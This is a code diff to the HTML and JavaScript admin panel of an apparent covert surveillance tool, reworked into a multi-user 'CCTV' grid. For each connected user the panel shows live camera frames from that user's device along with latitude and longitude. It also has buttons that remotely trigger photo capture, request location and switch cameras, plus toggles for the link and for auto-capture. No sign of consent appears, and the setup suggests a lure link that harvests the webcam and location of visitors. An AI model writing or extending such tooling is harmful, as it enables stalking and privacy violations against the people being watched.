@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin Dashboard</title>
+<title>Admin Dashboard - CCTV Mode</title>
 <style>
 * { box-sizing: border-box; }
 body { margin: 0; padding: 20px; background: #121212; color: #eee; font-family: Arial, sans-serif; }
@@ -19,10 +19,11 @@ button.success { background: #27ae60; }
 button.switch { background: #8e44ad; }
 button.gray { background: #555; }
 .status { font-weight: bold; }
-.users { display: grid; gap: 10px; }
-.user { background: #292929; padding: 12px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
+.users { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
+.user-card { background: #292929; padding: 15px; border-radius: 8px; display: flex; flex-direction: column; gap: 10px; border: 1px solid #444; }
 .user-info { font-size: 13px; }
-.live { width: 100%; max-width: 640px; background: #000; border-radius: 8px; display: block; margin: auto; }
+.cctv-feed { width: 100%; height: 180px; background: #000; border-radius: 6px; object-fit: cover; display: block; }
+.user-actions { display: flex; gap: 5px; flex-wrap: wrap; margin-top: 5px; }
 .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
 .photo { background: #292929; padding: 10px; border-radius: 8px; }
 .photo img { width: 100%; border-radius: 6px; display: block; margin-bottom: 8px; }
@@ -46,7 +47,7 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
 </div>
 
 <div id="dashboard" class="container hidden">
-    <h1>Admin Dashboard</h1>
+    <h1>Admin Dashboard (CCTV Live View)</h1>
     
     <div class="panel">
         <h2>Controls</h2>
@@ -59,21 +60,9 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
     </div>
 
     <div class="panel">
-        <h2>Active Users</h2>
+        <h2>Active Users CCTV Feeds</h2>
         <p id="userCount">0 / 5</p>
         <div id="usersList" class="users">Waiting for users...</div>
-    </div>
-
-    <div class="panel">
-        <h2>Live Feed & Actions</h2>
-        <p id="selectedUser">No user selected.</p>
-        <img id="liveImage" class="live" style="display:none;">
-        <br>
-        <div class="controls" style="justify-content: center; margin-top: 10px;">
-            <button id="captureButton" onclick="captureSelectedUser()" disabled>Capture Photo</button>
-            <button id="locButton" class="success" onclick="requestUserLocation()" disabled>📍 Request Location</button>
-            <button id="switchCamButton" class="switch" onclick="switchUserCamera()" disabled>🔄 Switch Camera</button>
-        </div>
     </div>
 
     <div class="panel">
@@ -90,7 +79,6 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
 <script src="/socket.io/socket.io.js"></script>
 <script>
 let socket = null;
-let selectedSocketId = null;
 let isLinkActive = true;
 let isAutoCapture = true;
 let maxUsers = 5;
@@ -155,12 +143,15 @@ function connectSocket() {
     socket.on("link-status", status => { isLinkActive = status; updateLinkUI(); });
     socket.on("auto-capture-status", status => { isAutoCapture = status; updateAutoUI(); });
     socket.on("access-event", event => { addHistoryEvent(event); });
+    
     socket.on("update-live-stream", data => {
-        if (data.socketId !== selectedSocketId) return;
-        const img = document.getElementById("liveImage");
-        img.src = data.frameData;
-        img.style.display = "block";
+        const img = document.getElementById(`cctv-${data.socketId}`);
+        if (img) {
+            img.src = data.frameData;
+            img.style.display = "block";
+        }
     });
+
     socket.on("new-photo", photo => { addPhoto(photo); });
     socket.on("photo-deleted", photoId => {
         const element = document.getElementById(`photo-${photoId}`);
@@ -170,81 +161,48 @@ function connectSocket() {
 
 function renderUsers(users) {
     const container = document.getElementById("usersList");
-    container.innerHTML = "";
     const ids = Object.keys(users);
     document.getElementById("userCount").textContent = `${ids.length} / ${maxUsers}`;
 
     if (ids.length === 0) {
-        container.textContent = "No active users.";
-        selectedSocketId = null;
-        document.getElementById("captureButton").disabled = true;
-        document.getElementById("locButton").disabled = true;
-        document.getElementById("switchCamButton").disabled = true;
-        document.getElementById("liveImage").style.display = "none";
+        container.innerHTML = "No active users.";
         return;
     }
 
+    // Keep existing cards or recreate cleanly
+    container.innerHTML = "";
+
     ids.forEach(id => {
         const user = users[id];
-        const div = document.createElement("div");
-        div.className = "user";
-        const info = document.createElement("div");
-        info.className = "user-info";
+        const card = document.createElement("div");
+        card.className = "user-card";
+        card.id = `user-card-${id}`;
 
         let locationText = "Location: Fetching...";
         if (user.location) {
-            locationText = `Location: Lat ${user.location.latitude}, Lng ${user.location.longitude}`;
+            locationText = `Lat: ${user.location.latitude}, Lng: ${user.location.longitude}`;
         }
 
-        info.innerHTML = `
-            <strong>${escapeHtml(user.deviceInfo)}</strong><br>
-            <small>ID: ${escapeHtml(id.substring(0, 8))}...</small><br>
-            <small>Connected: ${escapeHtml(user.connectedAt)}</small><br>
-            <small style="color: #2ecc71;">${escapeHtml(locationText)}</small>
+        card.innerHTML = `
+            <img id="cctv-${id}" class="cctv-feed" style="display:none;" alt="Live Feed">
+            <div class="user-info">
+                <strong>${escapeHtml(user.deviceInfo)}</strong><br>
+                <small>ID: ${escapeHtml(id.substring(0, 8))}</small><br>
+                <small style="color: #2ecc71;">📍 ${escapeHtml(locationText)}</small>
+            </div>
+            <div class="user-actions">
+                <button onclick="captureUser('${id}')">Capture</button>
+                <button class="success" onclick="requestLoc('${id}')">Location</button>
+                <button class="switch" onclick="switchCam('${id}')">Switch Cam</button>
+            </div>
         `;
-
-        const button = document.createElement("button");
-        button.textContent = "View";
-        button.onclick = () => { selectUser(id, user.deviceInfo); };
-
-        div.appendChild(info);
-        div.appendChild(button);
-        container.appendChild(div);
+        container.appendChild(card);
     });
-
-    if (selectedSocketId && !users[selectedSocketId]) {
-        selectedSocketId = null;
-        document.getElementById("selectedUser").textContent = "Selected user disconnected.";
-        document.getElementById("captureButton").disabled = true;
-        document.getElementById("locButton").disabled = true;
-        document.getElementById("switchCamButton").disabled = true;
-        document.getElementById("liveImage").style.display = "none";
-    }
 }
 
-function selectUser(id, name) {
-    selectedSocketId = id;
-    document.getElementById("selectedUser").textContent = `Viewing: ${name} (${id.substring(0, 8)})`;
-    document.getElementById("captureButton").disabled = false;
-    document.getElementById("locButton").disabled = false;
-    document.getElementById("switchCamButton").disabled = false;
-    socket.emit("admin-select-user", id);
-}
-
-function captureSelectedUser() {
-    if (!selectedSocketId) return;
-    socket.emit("admin-trigger-capture", selectedSocketId);
-}
-
-function requestUserLocation() {
-    if (!selectedSocketId) return;
-    socket.emit("admin-request-location", selectedSocketId);
-}
-
-function switchUserCamera() {
-    if (!selectedSocketId) return;
-    socket.emit("admin-switch-camera", selectedSocketId);
-}
+function captureUser(id) { socket.emit("admin-trigger-capture", id); }
+function requestLoc(id) { socket.emit("admin-request-location", id); }
+function switchCam(id) { socket.emit("admin-switch-camera", id); }
 
 async function toggleLink() {
     const newStatus = !isLinkActive;
@@ -353,7 +311,7 @@ function addHistoryEvent(event, prepend = true) {
     item.innerHTML = `
         <strong>${type}</strong><br>
         Device: ${escapeHtml(event.deviceInfo || "Unknown")}<br>
-        Session: ${escapeHtml((event.socketId || "").substring(0, 8))}...<br>
+        Session: ${escapeHtml((event.socketId || "").substring(0, 8))}<br>
         Time: ${escapeHtml(event.time || "")}
     `;
 
